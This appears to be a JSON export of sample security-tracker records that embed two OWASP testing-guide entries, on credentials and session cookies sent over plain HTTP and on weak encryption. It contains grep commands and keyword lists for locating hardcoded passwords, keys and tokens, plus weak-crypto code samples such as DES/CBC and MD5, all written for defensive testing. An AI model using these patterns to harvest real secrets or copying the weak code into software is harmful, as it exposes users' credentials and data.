Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Sensitive data must be protected when it is transmitted through the network. If data is transmitted over HTTPS or encrypted in another way the protection mechanism must not have limitations or vulnerabilities, as explained in the broader article Testing for Weak Transport Layer Security and in other OWASP documentation:\nOWASP Top 10 2017 A3-Sensitive Data Exposure.\nOWASP ASVS - Verification V9.\nTransport Layer Protection Cheat Sheet.\nAs a rule of thumb if data must be protected when it is stored, this data must also be protected during transmission. Some examples for sensitive data are:\nInformation used in authentication (e.g. Credentials, PINs, Session identifiers, Tokens, Cookies\u2026)\nInformation protected by laws, regulations or specific organizational policy (e.g. Credit Cards, Customers data)\nIf the application transmits sensitive information via unencrypted channels - e.g. HTTP - it is considered a security risk. Attackers can take over accounts by sniffing network traffic. Some examples are Basic authentication which sends authentication credentials in plain-text over HTTP, form based authentication credentials sent via HTTP, or plain-text transmission of any other information considered sensitive due to regulations, laws, organizational policy or application business logic.\nExamples for Personal Identifying Information (PII) are:\nSocial security numbers\nBank account numbers\nPassport information\nHealthcare related information\nMedical insurance information\nStudent information\nCredit and debit card numbers\nDriver\u2019s license and State ID information","TestingInstructions":"## Test Objectives\n\n* Identify sensitive information transmitted through the various channels.\n* Assess the privacy and security of the channels used.\n\n## How to Test\n\nVarious types of information that must be protected, could be transmitted by the application in clear text. To check if this information is transmitted over HTTP instead of HTTPS, capture traffic between a client and web application server that needs credentials. For any message containing sensitive data, verify the exchange occurred using HTTPS. See more information about insecure transmission of credentials [OWASP Top 10 2017 A3-Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) or [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html).\n\n### Example 1: Basic Authentication over HTTP\n\nA typical example is the usage of Basic Authentication over HTTP. When using Basic Authentication, user credentials are encoded rather than encrypted, and are sent as HTTP headers. In the example below the tester uses [curl](https://curl.haxx.se/) to test for this issue. Note how the application uses Basic authentication, and HTTP rather than HTTPS.\n\n\u0060\u0060\u0060\n$ curl -kis http://example.com/restricted/\nHTTP/1.1 401 Authorization Required\nDate: Fri, 01 Aug 2013 00:00:00 GMT\nWWW-Authenticate: Basic realm=\u0022Restricted Area\u0022\nAccept-Ranges: bytes Vary:\nAccept-Encoding Content-Length: 162\nContent-Type: text/html\n\n\u003Chtml\u003E\u003Chead\u003E\u003Ctitle\u003E401 Authorization Required\u003C/title\u003E\u003C/head\u003E\n\u003Cbody bgcolor=white\u003E \u003Ch1\u003E401 Authorization Required\u003C/h1\u003E  Invalid login credentials!  \u003C/body\u003E\u003C/html\u003E\n\u0060\u0060\u0060\n\n### Example 2: Form-Based Authentication Performed over HTTP\n\nAnother typical example is authentication forms which transmit user authentication credentials over HTTP. In the example below one can see HTTP being used in the \u0060action\u0060 attribute of the form. It is also possible to see this issue by examining the HTTP traffic with an interception proxy.\n\n\u0060\u0060\u0060\n\u003Cform action=\u0022http://example.com/login\u0022\u003E\n    \u003Clabel for=\u0022username\u0022\u003EUser:\u003C/label\u003E \u003Cinput type=\u0022text\u0022 id=\u0022username\u0022 name=\u0022username\u0022 value=\u0022\u0022/\u003E\u003Cbr /\u003E\n    \u003Clabel for=\u0022password\u0022\u003EPassword:\u003C/label\u003E \u003Cinput type=\u0022password\u0022 id=\u0022password\u0022 name=\u0022password\u0022 value=\u0022\u0022/\u003E\n    \u003Cinput type=\u0022submit\u0022 value=\u0022Login\u0022/\u003E\n\u003C/form\u003E\n\u0060\u0060\u0060\n\n### Example 3: Cookie Containing Session ID Sent over HTTP\n\nThe Session ID Cookie must be transmitted over protected channels. If the cookie does not have the [secure flag](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes) set, it is permitted for the application to transmit it unencrypted. Note below the setting of the cookie is done without the Secure flag, and the entire log in process is performed in HTTP and not HTTPS.\n\n\u0060\u0060\u0060\nhttps://secure.example.com/login\n\nPOST /login HTTP/1.1\nHost: secure.example.com\n[...]\nReferer: https://secure.example.com/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 188\n\nHTTP/1.1 302 Found\nDate: Tue, 03 Dec 2013 21:18:55 GMT\nServer: Apache\nSet-Cookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA; expires=Fri, 01-Jan-2014 00:00:00 GMT; path=/; domain=example.com; httponly\nLocation: private/\nContent-Length: 0\nContent-Type: text/html\n\u0060\u0060\u0060\n\n\u0060\u0060\u0060\nhttp://example.com/private\n\nGET /private HTTP/1.1\nHost: example.com\n[...]\nReferer: https://secure.example.com/login\nCookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA;\n\nHTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\nContent-Length: 730\nDate: Tue, 25 Dec 2013 00:00:00 GMT\n\u0060\u0060\u0060\n\n### Example 4: Password Reset, Change Password or Other Account Manipulation over HTTP\n\nIf the web application has features that allow a user to change an account or call a different service with credentials, verify all of those interactions use HTTPS. The interactions to test include the following:\n\n* Forms that allow users to handle a forgotten password or other credentials\n* Forms that allow users to edit credentials\n* Forms that require the user to authenticate with another provider (for example, payment processing)\n\n### Example 5: Testing Password Sensitive Information in Source Code or Logs\n\nUse one of the following techniques to search for sensitive information.\nChecking if password or encryption key is hardcoded in the source code or configuration files.\n\u0060grep -r \u2013E \u0022Pass | password | pwd |user | guest| admin | encry | key | decrypt | sharekey \u0022 ./PathToSearch/\u0060\nChecking if logs or source code may contain phone number, email address, ID or any other PII. Change the regular expression based on the format of the PII.\n\u0060grep -r \u0022 {2\\}[0-9]\\{6\\} \u0022 ./PathToSearch/\u0060\n\n## Tools\n\n* [curl](https://curl.haxx.se/)\n* [grep](http://man7.org/linux/man-pages/man1/egrep.1.html)\n* [Wireshark](https://www.wireshark.org/)\n* [TCPDUMP](https://www.tcpdump.org/)\n\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nUse HTTPS for the whole web site and redirect any HTTP requests to HTTPS.\n\n## ","References":"* [OWASP Insecure Transport](https://owasp.org/www-community/vulnerabilities/Insecure_Transport)\n* [OWASP HTTP Strict Transport Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)\n* [Let\u2019s Encrypt](https://letsencrypt.org/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"09-Testing for Weak Cryptography","Description":"09-Testing for Weak Cryptography","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"2014080d-6a55-4189-a374-978f42561d7b","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CRYP-04 Testing for Weak Encryption","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Incorrect uses of encryption algorithms may result in sensitive data exposure, key leakage, broken authentication, insecure session, and spoofing attacks. There are some encryption or hash algorithms known to be weak and are not suggested for use such as MD5 and RC4.\nIn addition to the right choices of secure encryption or hash algorithms, the right uses of parameters also matter for the security level. For example, ECB (Electronic Code Book) mode is not suggested for use in asymmetric encryption","TestingInstructions":"## Test Objectives\n\n* Provide a guideline for the identification weak encryption or hashing uses and implementations.\n\n## How to Test\n\n### Basic Security Checklist\n\n* When using AES128 or AES256, the IV (Initialization Vector) must be random and unpredictable. Refer to [FIPS 140-2, Security Requirements for Cryptographic Modules](https://csrc.nist.gov/publications/detail/fips/140/2/final), section 4.9.1. random number generator tests. For example, in Java, \u0060java.util.Random\u0060 is considered a weak random number generator. \u0060java.security.SecureRandom\u0060 should be used instead of \u0060java.util.Random\u0060.\n* For asymmetric encryption, use Elliptic Curve Cryptography (ECC) with a secure curve like \u0060Curve25519\u0060 preferred.\n    * If ECC can\u2019t be used then use RSA encryption with a minimum 2048bit key.\n* When uses of RSA in signature, PSS padding is recommended.\n* Weak hash/encryption algorithms should not be used such MD5, RC4, DES, Blowfish, SHA1. 1024-bit RSA or DSA, 160-bit ECDSA (elliptic curves), 80/112-bit 2TDEA (two key triple DES)\n* Minimum Key length requirements:\n\n\u0060\u0060\u0060\nKey\u00A0exchange:\u00A0Diffie\u2013Hellman\u00A0key\u00A0exchange\u00A0with\u00A0minimum\u00A02048\u00A0bits\nMessage\u00A0Integrity:\u00A0HMAC-SHA2\nMessage\u00A0Hash:\u00A0SHA2\u00A0256\u00A0bits\nAsymmetric\u00A0encryption:\u00A0RSA\u00A02048\u00A0bits\nSymmetric-key\u00A0algorithm:\u00A0AES\u00A0128\u00A0bits\nPassword\u00A0Hashing:\u00A0PBKDF2,\u00A0Scrypt,\u00A0Bcrypt\nECDH, ECDSA:\u00A0256\u00A0bits\n\u0060\u0060\u0060\n\n* Uses of SSH, CBC mode should not be used.\n* When symmetric encryption algorithm is used, ECB (Electronic Code Book) mode should not be used.\n* When PBKDF2 is used to hash password, the parameter of iteration is recommended to be over 10000. [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html#sec5) also suggests at least 10,000 iterations of the hash function. In addition, MD5 hash function is forbidden to be used with PBKDF2 such as PBKDF2WithHmacMD5.\n\n### Source Code Review\n\n* Search for the following keywords to identify use of weak algorithms: \u0060MD4,\u00A0MD5,\u00A0RC4,\u00A0RC2,\u00A0DES,\u00A0Blowfish,\u00A0SHA-1,\u00A0ECB\u0060\n* For Java implementations, the following API is related to encryption. Review the parameters of the encryption implementation. For example,\n\n\u0060\u0060\u0060\nSecretKeyFactory(SecretKeyFactorySpi\u00A0keyFacSpi,\u00A0Provider\u00A0provider,\u00A0String\u00A0algorithm)\nSecretKeySpec(byte[]\u00A0key,\u00A0int\u00A0offset,\u00A0int\u00A0len,\u00A0String\u00A0algorithm)\nCipher\u00A0c\u00A0=\u00A0Cipher.getInstance(\u0022DES/CBC/PKCS5Padding\u0022);\n\u0060\u0060\u0060\n\n* For RSA encryption, the following padding modes are suggested.\n\n\u0060\u0060\u0060\nRSA/ECB/OAEPWithSHA-1AndMGF1Padding\u00A0(2048)\nRSA/ECB/OAEPWithSHA-256AndMGF1Padding\u00A0(2048)\n\u0060\u0060\u0060\n\n* Search for \u0060ECB\u0060, it\u2019s not allowed to be used in padding.\n* Review if different IV (initial Vector) is used.\n\n\u0060\u0060\u0060\n//\u00A0Use\u00A0a\u00A0different\u00A0IV\u00A0value\u00A0for\u00A0every\u00A0encryption\nbyte[]\u00A0newIv\u00A0=\u00A0...;\ns\u00A0=\u00A0new\u00A0GCMParameterSpec(s.getTLen(),\u00A0newIv);\ncipher.init(...,\u00A0s);\n...\n\u0060\u0060\u0060\n\n* Search for \u0060IvParameterSpec\u0060, check if the IV value is generated differently and randomly.\n\n\u0060\u0060\u0060\n\u00A0IvParameterSpec\u00A0iv\u00A0=\u00A0new\u00A0IvParameterSpec(randBytes);\n\u00A0SecretKeySpec\u00A0skey\u00A0=\u00A0new\u00A0SecretKeySpec(key.getBytes(),\u00A0\u0022AES\u0022);\n\u00A0Cipher\u00A0cipher\u00A0=\u00A0Cipher.getInstance(\u0022AES/CBC/PKCS5Padding\u0022);\n\u00A0cipher.init(Cipher.ENCRYPT_MODE,\u00A0skey,\u00A0iv);\n\u0060\u0060\u0060\n\n* In Java, search for MessageDigest to check if weak hash algorithm (MD5 or CRC) is used. For example:\n\n\u0060MessageDigest\u00A0md5\u00A0=\u00A0MessageDigest.getInstance(\u0022MD5\u0022);\u0060\n\n* For signature, SHA1 and MD5 should not be used. For example:\n\n\u0060Signature\u00A0sig\u00A0=\u00A0Signature.getInstance(\u0022SHA1withRSA\u0022);\u0060\n\n* Search for \u0060PBKDF2\u0060. To generate the hash value of password, \u0060PBKDF2\u0060 is suggested to be used. Review the parameters to generate the \u0060PBKDF2\u0060 has value.\n\nThe iterations should be over **10000**, and the **salt** value should be generated as **random value**.\n\n\u0060\u0060\u0060\nprivate\u00A0static\u00A0byte[]\u00A0pbkdf2(char[]\u00A0password,\u00A0byte[]\u00A0salt,\u00A0int\u00A0iterations,\u00A0int\u00A0bytes)\n\u00A0\u00A0\u00A0\u00A0throws\u00A0NoSuchAlgorithmException,\u00A0InvalidKeySpecException\n\u00A0\u00A0{\n\u00A0\u00A0\u00A0\u00A0\u00A0\u00A0\u00A0PBEKeySpec\u00A0spec\u00A0=\u00A0new\u00A0PBEKeySpec(password,\u00A0salt,\u00A0iterations,\u00A0bytes\u00A0*\u00A08);\n\u00A0\u00A0\u00A0\u00A0\u00A0\u00A0\u00A0SecretKeyFactory\u00A0skf\u00A0=\u00A0SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);\n\u00A0\u00A0\u00A0\u00A0\u00A0\u00A0\u00A0return\u00A0skf.generateSecret(spec).getEncoded();\n\u00A0\u00A0\u00A0}\n\u0060\u0060\u0060\n\n* Hard-coded sensitive information:\n\n\u0060\u0060\u0060\nUser\u00A0related\u00A0keywords:\u00A0name,\u00A0root,\u00A0su,\u00A0sudo, admin, superuser,\u00A0login,\u00A0username,\u00A0uid\nKey\u00A0related\u00A0keywords:\u00A0public\u00A0key,\u00A0AK,\u00A0SK,\u00A0secret\u00A0key,\u00A0private\u00A0key,\u00A0passwd,\u00A0password,\u00A0pwd,\u00A0share\u00A0key,\u00A0shared key, cryto,\u00A0base64\nOther\u00A0common\u00A0sensitive\u00A0keywords:\u00A0sysadmin,\u00A0root,\u00A0privilege,\u00A0pass,\u00A0key,\u00A0code,\u00A0master,\u00A0admin,\u00A0uname,\u00A0session,\u00A0token,\u00A0Oauth,\u00A0privatekey, shared secret\n\u0060\u0060\u0060\n\n## Tools\n\n* Vulnerability scanners such as Nessus, NMAP (scripts), or OpenVAS can scan for use or acceptance of weak encryption against protocol such as SNMP, TLS, SSH, SMTP, etc.\n* Use static code analysis tool to do source code review such as klocwork, Fortify, Coverity, CheckMark for the following cases.\n\n\u0060\u0060\u0060\nCWE-261:\u00A0Weak\u00A0Cryptography\u00A0for\u00A0Passwords\nCWE-323:\u00A0Reusing\u00A0a\u00A0Nonce,\u00A0Key\u00A0Pair\u00A0in\u00A0Encryption\nCWE-326:\u00A0Inadequate\u00A0Encryption\u00A0Strength\nCWE-327:\u00A0Use\u00A0of\u00A0a\u00A0Broken\u00A0or\u00A0Risky\u00A0Cryptographic\u00A0Algorithm\nCWE-328:\u00A0Reversible\u00A0One-Way\u00A0Hash\nCWE-329:\u00A0Not\u00A0Using\u00A0a\u00A0Random\u00A0IV\u00A0with\u00A0CBC\u00A0Mode\nCWE-330:\u00A0Use\u00A0of\u00A0Insufficiently\u00A0Random\u00A0Values\nCWE-347:\u00A0Improper\u00A0Verification\u00A0of\u00A0Cryptographic\u00A0Signature\nCWE-354:\u00A0Improper\u00A0Validation\u00A0of\u00A0Integrity\u00A0Check\u00A0Value\nCWE-547:\u00A0Use\u00A0of\u00A0Hard-coded,\u00A0Security-relevant\u00A0Constants\nCWE-780:\u00A0Use\u00A0of\u00A0RSA\u00A0Algorithm\u00A0without\u00A0OAEP\n\u0060\u0060\u0060","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [NIST FIPS Standards](https://csrc.nist.gov/publications/fips)\n* [Wikipedia: Initialization Vector](https://en.wikipedia.org/wiki/Initialization_vector)\n* [Secure Coding - Generating Strong Random Numbers](https://www.securecoding.cert.org/confluence/display/java/MSC02-J.\u002BGenerate\u002Bstrong\u002Brandom\u002Bnumbers)\n* [Optimal Asymmetric Encryption Padding](https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding)\n* [Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)\n* [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)\n* [Secure Coding - Do not use insecure or weak cryptographic algorithms](https://www.securecoding.cert.org/confluence/display/java/MSC61-J.\u002BDo\u002Bnot\u002Buse\u002Binsecure\u002Bor\u002Bweak\u002Bcryptographic\u002Balgorithms)\n* [Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness)\n* [Insufficient Entropy](https://owasp.org/www-community/vulnerabilities/Insufficient_Entropy)\n* [Insufficient Session-ID Length](https://owasp.org/www-community/vulnerabilities/Insufficient_Session-ID_Length)\n* [Using a broken or risky cryptographic algorithm](https://owasp.org/www-community/vulnerabilities/Using_a_broken_or_risky_cryptographic_algorithm)\n* [Javax.crypto.cipher API](https://docs.oracle.com/javase/8/docs/api/javax/crypto/Cipher.html)\n* ISO 18033-1:2015 \u2013 Encryption Algorithms\n* ISO 18033-2:2015 \u2013 Asymmetric Ciphers\n* ISO 18033-3:2015 \u2013 Block Ciphers\n\n1. \n\n\n\u003Cbr\u003E\n","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"09-Testing for Weak Cryptography","Description":"09-Testing for Weak Cryptography","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"2014080d-6a55-4189-a374-978f42561d7b","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}}]